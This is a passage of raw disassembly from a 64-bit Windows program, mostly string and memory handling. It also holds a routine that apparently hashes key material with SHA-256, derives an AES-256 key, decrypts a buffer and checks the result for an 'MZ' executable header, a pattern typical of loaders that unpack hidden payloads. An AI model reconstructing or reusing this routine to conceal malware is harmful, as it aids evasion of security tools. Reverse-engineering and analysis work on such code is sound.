   140002bf8:	e8 13 42 02 00       	call   0x140026e10
   140002bfd:	4c 8b c0             	mov    %rax,%r8
   140002c00:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   140002c04:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002c08:	e8 13 2a 00 00       	call   0x140005620
   140002c0d:	90                   	nop
   140002c0e:	4c 8b 7d 10          	mov    0x10(%rbp),%r15
   140002c12:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   140002c19:	ff ff 7f 
   140002c1c:	48 8b c7             	mov    %rdi,%rax
   140002c1f:	49 2b c7             	sub    %r15,%rax
   140002c22:	48 83 f8 0b          	cmp    $0xb,%rax
   140002c26:	0f 82 9a 0b 00 00    	jb     0x1400037c6
   140002c2c:	4c 8d 75 00          	lea    0x0(%rbp),%r14
   140002c30:	48 83 7d 18 0f       	cmpq   $0xf,0x18(%rbp)
   140002c35:	4c 0f 47 75 00       	cmova  0x0(%rbp),%r14
   140002c3a:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002c3d:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140002c42:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002c47:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   140002c4c:	49 8d 77 0b          	lea    0xb(%r15),%rsi
   140002c50:	48 83 fe 0f          	cmp    $0xf,%rsi
   140002c54:	0f 86 83 00 00 00    	jbe    0x140002cdd
   140002c5a:	48 8b c6             	mov    %rsi,%rax
   140002c5d:	48 83 c8 0f          	or     $0xf,%rax
   140002c61:	48 3b c7             	cmp    %rdi,%rax
   140002c64:	76 2e                	jbe    0x140002c94
   140002c66:	48 b8 27 00 00 00 00 	movabs $0x8000000000000027,%rax
   140002c6d:	00 00 80 
   140002c70:	48 8b c8             	mov    %rax,%rcx
   140002c73:	e8 58 58 00 00       	call   0x1400084d0
   140002c78:	48 85 c0             	test   %rax,%rax
   140002c7b:	0f 84 c7 0a 00 00    	je     0x140003748
   140002c81:	48 8d 58 27          	lea    0x27(%rax),%rbx
   140002c85:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   140002c89:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   140002c8d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002c92:	eb 53                	jmp    0x140002ce7
   140002c94:	48 8b f8             	mov    %rax,%rdi
   140002c97:	b9 16 00 00 00       	mov    $0x16,%ecx
   140002c9c:	48 3b c1             	cmp    %rcx,%rax
   140002c9f:	48 0f 42 f9          	cmovb  %rcx,%rdi
   140002ca3:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   140002ca7:	48 85 c9             	test   %rcx,%rcx
   140002caa:	75 0a                	jne    0x140002cb6
   140002cac:	49 8b dc             	mov    %r12,%rbx
   140002caf:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002cb4:	eb 31                	jmp    0x140002ce7
   140002cb6:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140002cbd:	72 0f                	jb     0x140002cce
   140002cbf:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140002cc3:	48 3b c1             	cmp    %rcx,%rax
   140002cc6:	0f 86 00 0b 00 00    	jbe    0x1400037cc
   140002ccc:	eb a2                	jmp    0x140002c70
   140002cce:	e8 fd 57 00 00       	call   0x1400084d0
   140002cd3:	48 8b d8             	mov    %rax,%rbx
   140002cd6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002cdb:	eb 0a                	jmp    0x140002ce7
   140002cdd:	bf 0f 00 00 00       	mov    $0xf,%edi
   140002ce2:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   140002ce7:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140002cec:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   140002cf1:	f2 0f 10 05 7f 1c 03 	movsd  0x31c7f(%rip),%xmm0        # 0x140034978
   140002cf8:	00 
   140002cf9:	f2 0f 11 03          	movsd  %xmm0,(%rbx)
   140002cfd:	8b 05 7c 1c 03 00    	mov    0x31c7c(%rip),%eax        # 0x14003497f
   140002d03:	89 43 07             	mov    %eax,0x7(%rbx)
   140002d06:	48 8d 4b 0b          	lea    0xb(%rbx),%rcx
   140002d0a:	4d 8b c7             	mov    %r15,%r8
   140002d0d:	49 8b d6             	mov    %r14,%rdx
   140002d10:	e8 2b 35 02 00       	call   0x140026240
   140002d15:	c6 04 1e 00          	movb   $0x0,(%rsi,%rbx,1)
   140002d19:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002d1e:	e8 9d f1 ff ff       	call   0x140001ec0
   140002d23:	90                   	nop
   140002d24:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002d29:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002d2d:	76 34                	jbe    0x140002d63
   140002d2f:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140002d34:	48 ff c2             	inc    %rdx
   140002d37:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002d3e:	72 1b                	jb     0x140002d5b
   140002d40:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140002d44:	48 2b c1             	sub    %rcx,%rax
   140002d47:	48 83 e8 08          	sub    $0x8,%rax
   140002d4b:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002d4f:	0f 87 f3 09 00 00    	ja     0x140003748
   140002d55:	48 83 c2 27          	add    $0x27,%rdx
   140002d59:	eb 03                	jmp    0x140002d5e
   140002d5b:	48 8b c8             	mov    %rax,%rcx
   140002d5e:	e8 b1 57 00 00       	call   0x140008514
   140002d63:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002d66:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002d69:	f3 0f 7f 4d e0       	movdqu %xmm1,-0x20(%rbp)
   140002d6e:	4c 89 65 f0          	mov    %r12,-0x10(%rbp)
   140002d72:	0f 11 45 20          	movups %xmm0,0x20(%rbp)
   140002d76:	4c 89 65 30          	mov    %r12,0x30(%rbp)
   140002d7a:	4c 89 65 38          	mov    %r12,0x38(%rbp)
   140002d7e:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   140002d84:	48 8d 15 f9 1b 03 00 	lea    0x31bf9(%rip),%rdx        # 0x140034984
   140002d8b:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140002d8f:	e8 8c 28 00 00       	call   0x140005620
   140002d94:	90                   	nop
   140002d95:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140002d99:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140002d9d:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002da1:	e8 ca 3c 00 00       	call   0x140006a70
   140002da6:	84 c0                	test   %al,%al
   140002da8:	0f 85 85 00 00 00    	jne    0x140002e33
   140002dae:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002db1:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140002db6:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002dbb:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   140002dc0:	41 b8 2a 00 00 00    	mov    $0x2a,%r8d
   140002dc6:	48 8d 15 c3 1b 03 00 	lea    0x31bc3(%rip),%rdx        # 0x140034990
   140002dcd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002dd2:	e8 49 28 00 00       	call   0x140005620
   140002dd7:	90                   	nop
   140002dd8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002ddd:	e8 de f0 ff ff       	call   0x140001ec0
   140002de2:	90                   	nop
   140002de3:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002de8:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002dec:	0f 86 e5 08 00 00    	jbe    0x1400036d7
   140002df2:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140002df7:	48 ff c2             	inc    %rdx
   140002dfa:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002e01:	72 23                	jb     0x140002e26
   140002e03:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140002e07:	48 2b c1             	sub    %rcx,%rax
   140002e0a:	48 83 e8 08          	sub    $0x8,%rax
   140002e0e:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002e12:	0f 87 a4 08 00 00    	ja     0x1400036bc
   140002e18:	48 83 c2 27          	add    $0x27,%rdx
   140002e1c:	e8 f3 56 00 00       	call   0x140008514
   140002e21:	e9 b1 08 00 00       	jmp    0x1400036d7
   140002e26:	48 8b c8             	mov    %rax,%rcx
   140002e29:	e8 e6 56 00 00       	call   0x140008514
   140002e2e:	e9 a4 08 00 00       	jmp    0x1400036d7
   140002e33:	4c 8d 4d 55          	lea    0x55(%rbp),%r9
   140002e37:	4c 8b 45 e8          	mov    -0x18(%rbp),%r8
   140002e3b:	4c 2b 45 e0          	sub    -0x20(%rbp),%r8
   140002e3f:	49 bf cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r15
   140002e46:	cc cc cc 
   140002e49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002e50:	49 ff c9             	dec    %r9
   140002e53:	49 8b c7             	mov    %r15,%rax
   140002e56:	49 f7 e0             	mul    %r8
   140002e59:	48 c1 ea 03          	shr    $0x3,%rdx
   140002e5d:	0f b6 c2             	movzbl %dl,%eax
   140002e60:	c0 e0 02             	shl    $0x2,%al
   140002e63:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   140002e66:	02 c9                	add    %cl,%cl
   140002e68:	44 2a c1             	sub    %cl,%r8b
   140002e6b:	41 80 c0 30          	add    $0x30,%r8b
   140002e6f:	45 88 01             	mov    %r8b,(%r9)
   140002e72:	4c 8b c2             	mov    %rdx,%r8
   140002e75:	48 85 d2             	test   %rdx,%rdx
   140002e78:	75 d6                	jne    0x140002e50
   140002e7a:	4c 8d 45 55          	lea    0x55(%rbp),%r8
   140002e7e:	49 8b d1             	mov    %r9,%rdx
   140002e81:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002e86:	e8 f5 22 00 00       	call   0x140005180
   140002e8b:	90                   	nop
   140002e8c:	4c 8b 44 24 60       	mov    0x60(%rsp),%r8
   140002e91:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002e96:	48 8b c1             	mov    %rcx,%rax
   140002e99:	49 2b c0             	sub    %r8,%rax
   140002e9c:	41 be 26 00 00 00    	mov    $0x26,%r14d
   140002ea2:	48 8d 3d 17 1b 03 00 	lea    0x31b17(%rip),%rdi        # 0x1400349c0
   140002ea9:	49 3b c6             	cmp    %r14,%rax
   140002eac:	72 7c                	jb     0x140002f2a
   140002eae:	49 8d 40 26          	lea    0x26(%r8),%rax
   140002eb2:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140002eb7:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   140002ebc:	48 83 f9 0f          	cmp    $0xf,%rcx
   140002ec0:	48 0f 47 5c 24 50    	cmova  0x50(%rsp),%rbx
   140002ec6:	48 8d 05 19 1b 03 00 	lea    0x31b19(%rip),%rax        # 0x1400349e6
   140002ecd:	48 3b c3             	cmp    %rbx,%rax
   140002ed0:	76 1b                	jbe    0x140002eed
   140002ed2:	4a 8d 04 03          	lea    (%rbx,%r8,1),%rax
   140002ed6:	48 3b f8             	cmp    %rax,%rdi
   140002ed9:	77 12                	ja     0x140002eed
   140002edb:	48 3b df             	cmp    %rdi,%rbx
   140002ede:	77 05                	ja     0x140002ee5
   140002ee0:	49 8b f4             	mov    %r12,%rsi
   140002ee3:	eb 0b                	jmp    0x140002ef0
   140002ee5:	48 8b f3             	mov    %rbx,%rsi
   140002ee8:	48 2b f7             	sub    %rdi,%rsi
   140002eeb:	eb 03                	jmp    0x140002ef0
   140002eed:	49 8b f6             	mov    %r14,%rsi
   140002ef0:	49 ff c0             	inc    %r8
   140002ef3:	48 8d 4b 26          	lea    0x26(%rbx),%rcx
   140002ef7:	48 8b d3             	mov    %rbx,%rdx
   140002efa:	e8 41 33 02 00       	call   0x140026240
   140002eff:	4c 8b c6             	mov    %rsi,%r8
   140002f02:	48 8b d7             	mov    %rdi,%rdx
   140002f05:	48 8b cb             	mov    %rbx,%rcx
   140002f08:	e8 33 33 02 00       	call   0x140026240
   140002f0d:	4c 2b f6             	sub    %rsi,%r14
   140002f10:	48 8d 57 26          	lea    0x26(%rdi),%rdx
   140002f14:	48 03 d6             	add    %rsi,%rdx
   140002f17:	48 8d 0c 33          	lea    (%rbx,%rsi,1),%rcx
   140002f1b:	4d 8b c6             	mov    %r14,%r8
   140002f1e:	e8 1d 33 02 00       	call   0x140026240
   140002f23:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140002f28:	eb 17                	jmp    0x140002f41
   140002f2a:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002f2f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002f34:	49 8b d6             	mov    %r14,%rdx
   140002f37:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002f3c:	e8 1f 39 00 00       	call   0x140006860
   140002f41:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002f44:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140002f49:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002f4e:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   140002f53:	0f 10 00             	movups (%rax),%xmm0
   140002f56:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140002f5b:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002f5f:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   140002f64:	4c 89 60 10          	mov    %r12,0x10(%rax)
   140002f68:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   140002f6f:	00 
   140002f70:	c6 00 00             	movb   $0x0,(%rax)
   140002f73:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002f78:	e8 43 ef ff ff       	call   0x140001ec0
   140002f7d:	90                   	nop
   140002f7e:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002f83:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002f87:	76 37                	jbe    0x140002fc0
   140002f89:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140002f8e:	48 ff c2             	inc    %rdx
   140002f91:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002f98:	72 1e                	jb     0x140002fb8
   140002f9a:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140002f9e:	48 2b c1             	sub    %rcx,%rax
   140002fa1:	48 83 e8 08          	sub    $0x8,%rax
   140002fa5:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002fa9:	77 06                	ja     0x140002fb1
   140002fab:	48 83 c2 27          	add    $0x27,%rdx
   140002faf:	eb 0a                	jmp    0x140002fbb
   140002fb1:	b9 05 00 00 00       	mov    $0x5,%ecx
   140002fb6:	cd 29                	int    $0x29
   140002fb8:	48 8b c8             	mov    %rax,%rcx
   140002fbb:	e8 54 55 00 00       	call   0x140008514
   140002fc0:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002fc5:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   140002fcc:	00 00 
   140002fce:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   140002fd3:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   140002fd8:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002fdc:	76 34                	jbe    0x140003012
   140002fde:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140002fe3:	48 ff c2             	inc    %rdx
   140002fe6:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002fed:	72 1b                	jb     0x14000300a
   140002fef:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140002ff3:	48 2b c1             	sub    %rcx,%rax
   140002ff6:	48 83 e8 08          	sub    $0x8,%rax
   140002ffa:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002ffe:	0f 87 b8 06 00 00    	ja     0x1400036bc
   140003004:	48 83 c2 27          	add    $0x27,%rdx
   140003008:	eb 03                	jmp    0x14000300d
   14000300a:	48 8b c8             	mov    %rax,%rcx
   14000300d:	e8 02 55 00 00       	call   0x140008514
   140003012:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003015:	f3 0f 7f 4d b8       	movdqu %xmm1,-0x48(%rbp)
   14000301a:	4c 89 65 c8          	mov    %r12,-0x38(%rbp)
   14000301e:	4c 89 65 d8          	mov    %r12,-0x28(%rbp)
   140003022:	4c 89 65 d0          	mov    %r12,-0x30(%rbp)
   140003026:	4c 89 65 f8          	mov    %r12,-0x8(%rbp)
   14000302a:	c7 44 24 20 00 00 00 	movl   $0xf0000000,0x20(%rsp)
   140003031:	f0 
   140003032:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   140003038:	45 33 c0             	xor    %r8d,%r8d
   14000303b:	33 d2                	xor    %edx,%edx
   14000303d:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140003041:	ff 15 c9 4f 02 00    	call   *0x24fc9(%rip)        # 0x140028010
   140003047:	41 be 20 00 00 00    	mov    $0x20,%r14d
   14000304d:	85 c0                	test   %eax,%eax
   14000304f:	0f 84 f6 00 00 00    	je     0x14000314b
   140003055:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140003059:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000305e:	45 33 c9             	xor    %r9d,%r9d
   140003061:	45 33 c0             	xor    %r8d,%r8d
   140003064:	ba 0c 80 00 00       	mov    $0x800c,%edx
   140003069:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   14000306d:	ff 15 ad 4f 02 00    	call   *0x24fad(%rip)        # 0x140028020
   140003073:	85 c0                	test   %eax,%eax
   140003075:	0f 84 d0 00 00 00    	je     0x14000314b
   14000307b:	45 33 c9             	xor    %r9d,%r9d
   14000307e:	45 8b c6             	mov    %r14d,%r8d
   140003081:	48 8d 15 70 1b 03 00 	lea    0x31b70(%rip),%rdx        # 0x140034bf8
   140003088:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   14000308c:	ff 15 9e 4f 02 00    	call   *0x24f9e(%rip)        # 0x140028030
   140003092:	85 c0                	test   %eax,%eax
   140003094:	0f 84 b1 00 00 00    	je     0x14000314b
   14000309a:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   14000309e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400030a3:	45 33 c9             	xor    %r9d,%r9d
   1400030a6:	4c 8b 45 d0          	mov    -0x30(%rbp),%r8
   1400030aa:	ba 10 66 00 00       	mov    $0x6610,%edx
   1400030af:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   1400030b3:	ff 15 6f 4f 02 00    	call   *0x24f6f(%rip)        # 0x140028028
   1400030b9:	85 c0                	test   %eax,%eax
   1400030bb:	0f 84 8a 00 00 00    	je     0x14000314b
   1400030c1:	8b 55 e8             	mov    -0x18(%rbp),%edx
   1400030c4:	2b 55 e0             	sub    -0x20(%rbp),%edx
   1400030c7:	89 55 b0             	mov    %edx,-0x50(%rbp)
   1400030ca:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   1400030ce:	e8 3d e1 ff ff       	call   0x140001210
   1400030d3:	44 8b 45 b0          	mov    -0x50(%rbp),%r8d
   1400030d7:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   1400030db:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
   1400030df:	e8 5c 31 02 00       	call   0x140026240
   1400030e4:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   1400030e8:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400030ec:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400030f1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400030f6:	45 33 c9             	xor    %r9d,%r9d
   1400030f9:	33 d2                	xor    %edx,%edx
   1400030fb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003101:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140003105:	ff 15 0d 4f 02 00    	call   *0x24f0d(%rip)        # 0x140028018
   14000310b:	85 c0                	test   %eax,%eax
   14000310d:	75 10                	jne    0x14000311f
   14000310f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140003113:	48 3b 45 c0          	cmp    -0x40(%rbp),%rax
   140003117:	74 36                	je     0x14000314f
   140003119:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   14000311d:	eb 30                	jmp    0x14000314f
   14000311f:	8b 55 b0             	mov    -0x50(%rbp),%edx
   140003122:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140003126:	e8 e5 e0 ff ff       	call   0x140001210
   14000312b:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   14000312f:	ff 15 d3 4e 02 00    	call   *0x24ed3(%rip)        # 0x140028008
   140003135:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140003139:	ff 15 f9 4e 02 00    	call   *0x24ef9(%rip)        # 0x140028038
   14000313f:	33 d2                	xor    %edx,%edx
   140003141:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   140003145:	ff 15 b5 4e 02 00    	call   *0x24eb5(%rip)        # 0x140028000
   14000314b:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   14000314f:	4c 8b 45 c0          	mov    -0x40(%rbp),%r8
   140003153:	4c 2b c0             	sub    %rax,%r8
   140003156:	49 83 f8 02          	cmp    $0x2,%r8
   14000315a:	0f 82 68 03 00 00    	jb     0x1400034c8
   140003160:	80 38 4d             	cmpb   $0x4d,(%rax)
   140003163:	0f 85 5f 03 00 00    	jne    0x1400034c8
   140003169:	80 78 01 5a          	cmpb   $0x5a,0x1(%rax)
   14000316d:	0f 85 55 03 00 00    	jne    0x1400034c8
   140003173:	4c 8d 4d 55          	lea    0x55(%rbp),%r9
   140003177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000317e:	00 00 
   140003180:	49 ff c9             	dec    %r9
   140003183:	49 8b c7             	mov    %r15,%rax
   140003186:	49 f7 e0             	mul    %r8
   140003189:	48 c1 ea 03          	shr    $0x3,%rdx
   14000318d:	0f b6 c2             	movzbl %dl,%eax
   140003190:	c0 e0 02             	shl    $0x2,%al
   140003193:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   140003196:	02 c9                	add    %cl,%cl
   140003198:	44 2a c1             	sub    %cl,%r8b
   14000319b:	41 80 c0 30          	add    $0x30,%r8b
   14000319f:	45 88 01             	mov    %r8b,(%r9)
   1400031a2:	4c 8b c2             	mov    %rdx,%r8
   1400031a5:	48 85 d2             	test   %rdx,%rdx
   1400031a8:	75 d6                	jne    0x140003180
   1400031aa:	4c 8d 45 55          	lea    0x55(%rbp),%r8
   1400031ae:	49 8b d1             	mov    %r9,%rdx
   1400031b1:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400031b6:	e8 c5 1f 00 00       	call   0x140005180
   1400031bb:	90                   	nop
   1400031bc:	4c 8b 45 80          	mov    -0x80(%rbp),%r8
   1400031c0:	48 8b 4d 88          	mov    -0x78(%rbp),%rcx
   1400031c4:	48 8b c1             	mov    %rcx,%rax
   1400031c7:	49 2b c0             	sub    %r8,%rax
   1400031ca:	48 8d 35 4f 18 03 00 	lea    0x3184f(%rip),%rsi        # 0x140034a20
   1400031d1:	48 83 f8 20          	cmp    $0x20,%rax
   1400031d5:	72 7b                	jb     0x140003252
   1400031d7:	49 8d 40 20          	lea    0x20(%r8),%rax
   1400031db:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   1400031df:	48 8d 5c 24 70       	lea    0x70(%rsp),%rbx
   1400031e4:	48 83 f9 0f          	cmp    $0xf,%rcx
   1400031e8:	48 0f 47 5c 24 70    	cmova  0x70(%rsp),%rbx
   1400031ee:	48 8d 05 4b 18 03 00 	lea    0x3184b(%rip),%rax        # 0x140034a40
   1400031f5:	48 3b c3             	cmp    %rbx,%rax
   1400031f8:	76 1b                	jbe    0x140003215
   1400031fa:	4a 8d 04 03          	lea    (%rbx,%r8,1),%rax
   1400031fe:	48 3b f0             	cmp    %rax,%rsi
   140003201:	77 12                	ja     0x140003215
   140003203:	48 3b de             	cmp    %rsi,%rbx
   140003206:	77 05                	ja     0x14000320d
   140003208:	49 8b fc             	mov    %r12,%rdi
   14000320b:	eb 0b                	jmp    0x140003218
   14000320d:	48 8b fb             	mov    %rbx,%rdi
   140003210:	48 2b fe             	sub    %rsi,%rdi
   140003213:	eb 03                	jmp    0x140003218
   140003215:	49 8b fe             	mov    %r14,%rdi
   140003218:	49 ff c0             	inc    %r8
   14000321b:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
   14000321f:	48 8b d3             	mov    %rbx,%rdx
   140003222:	e8 19 30 02 00       	call   0x140026240
   140003227:	4c 8b c7             	mov    %rdi,%r8
   14000322a:	48 8b d6             	mov    %rsi,%rdx
   14000322d:	48 8b cb             	mov    %rbx,%rcx
   140003230:	e8 0b 30 02 00       	call   0x140026240
   140003235:	4c 2b f7             	sub    %rdi,%r14
   140003238:	48 8d 56 20          	lea    0x20(%rsi),%rdx
   14000323c:	48 03 d7             	add    %rdi,%rdx
   14000323f:	48 8d 0c 3b          	lea    (%rbx,%rdi,1),%rcx
   140003243:	4d 8b c6             	mov    %r14,%r8
   140003246:	e8 f5 2f 02 00       	call   0x140026240
   14000324b:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140003250:	eb 17                	jmp    0x140003269
   140003252:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140003257:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000325c:	49 8b d6             	mov    %r14,%rdx
   14000325f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140003264:	e8 f7 35 00 00       	call   0x140006860
   140003269:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000326c:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140003271:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140003276:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   14000327b:	0f 10 00             	movups (%rax),%xmm0
   14000327e:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140003283:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003287:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   14000328c:	4c 89 60 10          	mov    %r12,0x10(%rax)
   140003290:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   140003297:	00 
   140003298:	c6 00 00             	movb   $0x0,(%rax)
   14000329b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400032a0:	e8 1b ec ff ff       	call   0x140001ec0
   1400032a5:	90                   	nop
   1400032a6:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400032ab:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400032af:	76 37                	jbe    0x1400032e8
   1400032b1:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400032b6:	48 ff c2             	inc    %rdx
   1400032b9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400032c0:	72 1e                	jb     0x1400032e0
   1400032c2:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   1400032c6:	48 2b c1             	sub    %rcx,%rax
   1400032c9:	48 83 e8 08          	sub    $0x8,%rax
   1400032cd:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400032d1:	77 06                	ja     0x1400032d9
   1400032d3:	48 83 c2 27          	add    $0x27,%rdx
   1400032d7:	eb 0a                	jmp    0x1400032e3
   1400032d9:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400032de:	cd 29                	int    $0x29
   1400032e0:	48 8b c8             	mov    %rax,%rcx
   1400032e3:	e8 2c 52 00 00       	call   0x140008514
   1400032e8:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   1400032ed:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   1400032f4:	00 00 
   1400032f6:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   1400032fb:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
   1400032ff:	48 83 fa 0f          	cmp    $0xf,%rdx
   140003303:	76 34                	jbe    0x140003339
   140003305:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000330a:	48 ff c2             	inc    %rdx
   14000330d:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003314:	72 1b                	jb     0x140003331
   140003316:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   14000331a:	48 2b c1             	sub    %rcx,%rax
   14000331d:	48 83 e8 08          	sub    $0x8,%rax
   140003321:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003325:	0f 87 51 03 00 00    	ja     0x14000367c
   14000332b:	48 83 c2 27          	add    $0x27,%rdx
   14000332f:	eb 03                	jmp    0x140003334
   140003331:	48 8b c8             	mov    %rax,%rcx
   140003334:	e8 db 51 00 00       	call   0x140008514
   140003339:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000333c:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140003341:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140003346:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   14000334b:	41 b8 2a 00 00 00    	mov    $0x2a,%r8d
   140003351:	48 8d 15 f0 16 03 00 	lea    0x316f0(%rip),%rdx        # 0x140034a48
   140003358:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000335d:	e8 be 22 00 00       	call   0x140005620
   140003362:	90                   	nop
